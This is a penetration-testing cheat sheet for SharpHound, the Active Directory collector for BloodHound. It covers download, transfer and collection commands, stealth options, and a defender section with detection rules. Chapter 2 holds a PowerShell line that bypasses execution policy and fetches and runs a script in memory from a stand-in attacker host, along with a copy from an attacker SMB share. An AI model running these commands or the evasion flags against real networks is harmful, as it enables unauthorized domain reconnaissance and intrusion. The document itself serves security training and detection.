---
title: sharphound
category: discovery
subcategory: active_directory
phase: 09
mitre_attack: TA0007
tags:
  - active_directory
  - enumeration
  - windows
  - .net
  - data_collection
difficulty: advanced
os: windows
install: Download from GitHub
github: https://github.com/BloodHoundAD/SharpHound
related:
  - bloodhound
  - bloodhound-python
  - azurehound
---

# sharphound

## Chapter 1: Overview

**SharpHound** is the official Windows data collector for BloodHound. It enumerates Active Directory objects and relationships, outputting data in BloodHound-compatible format for attack path analysis.

### Key Features

- **Native Windows**: Runs as .NET assembly
- **Full enumeration**: Users, Groups, ACLs, Sessions
- **Stealth options**: Reduce detection
- **Loop collection**: Continuous monitoring
- **LDAP and GC**: Multiple data sources

### Collection Methods

| Method | Description |
|--------|-------------|
| LDAP | Primary data collection |
| Global Catalog | Cross-domain collection |
| Session | Active session enumeration |
| Local Groups | Local admin discovery |

---

## Chapter 2: Installation & Setup

### Download

```bash
# From GitHub releases
wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe
```

### Transfer to Windows

```bash
# Using SMB
impacket-smbserver share . -smb2support

# On Windows
copy \\ATTACKER_IP\share\SharpHound.exe C:\temp\
```

### Execute

```powershell
# In-memory
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp"

# Or run exe
.\SharpHound.exe -c All
```

---

## Chapter 3: Basic Usage

### Collect All Data

```powershell
.\SharpHound.exe -c All
```

### Collect Specific Data

```powershell
.\SharpHound.exe -c Users,Groups,ACLs
```

### Output Directory

```powershell
.\SharpHound.exe -c All --outputdirectory C:\temp
```

### Verbose Output

```powershell
.\SharpHound.exe -c All -v
```

---

## Chapter 4: Collection Methods

### Users

```powershell
.\SharpHound.exe -c Users
```

### Groups

```powershell
.\SharpHound.exe -c Groups
```

### ACLs

```powershell
.\SharpHound.exe -c ACLs
```

### Sessions

```powershell
.\SharpHound.exe -c Sessions
```

### Computers

```powershell
.\SharpHound.exe -c Computers
```

### All Data

```powershell
.\SharpHound.exe -c All
```

---

## Chapter 5: Stealth Options

### Loop Collection

```powershell
.\SharpHound.exe -c All --loop --loopduration 02:00:00
```

### Stealth Mode

```powershell
.\SharpHound.exe -c All --stealth
```

### Session Loop

```powershell
.\SharpHound.exe -c Sessions --loop --loopduration 01:00:00
```

### Randomize Timing

```powershell
.\SharpHound.exe -c All --randomize
```

---

## Chapter 6: Advanced Features

### Specify Domain

```powershell
.\SharpHound.exe -c All -d corp.local
```

### Specify Domain Controller

```powershell
.\SharpHound.exe -c All --DomainController 192.168.1.1
```

### Use SSL

```powershell
.\SharpHound.exe -c All --UseSSL
```

### Ignore DC Status

```powershell
.\SharpHound.exe -c All --IgnoreLdapCert
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: Initial Assessment

```powershell
# Run as domain user
.\SharpHound.exe -c All

# Transfer zip to Kali
# Upload to BloodHound
```

### Scenario 2: Stealth Assessment

```powershell
# Reduced visibility
.\SharpHound.exe -c All --stealth --loopduration 02:00:00
```

### Scenario 3: Session Enumeration

```powershell
# Find active admin sessions
.\SharpHound.exe -c Sessions --loopduration 04:00:00
```

---

## Chapter 8: Mitigation & Defense

**For defenders:**

- **Monitor SharpHound**: Detect LDAP enumeration
- **Alert on collection methods**: Monitor for All/Users/Groups
- **Audit LDAP queries**: Track enumeration patterns
- **Protect DA accounts**: Tiered administration
- **Honey tokens**: Detect enumeration
- **Network segmentation**: Limit LDAP access

### Detection Queries

```spl
# Splunk SharpHound detection
index=windows EventCode=4662 ObjectType="*user*" | stats count by SubjectUserName
```

### Sysmon Detection

```xml
<ProcessCreate>
  <Rule groupRelation="or">
    <Condition field="Image" condition="contains">SharpHound</Condition>
    <Condition field="CommandLine" condition="contains">Invoke-BloodHound</Condition>
  </Rule>
</ProcessCreate>
```

---

## Resources

- [SharpHound GitHub](https://github.com/BloodHoundAD/SharpHound)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [OffSec PEN-200 Course](https://www.offsec.com/courses/pen-200/)
- [OffSec PEN-300 Course](https://www.offsec.com/courses/pen-300/)
- [AD Security](https://adsecurity.org/)

---

*Generated for educational purposes in authorized security testing environments only.*
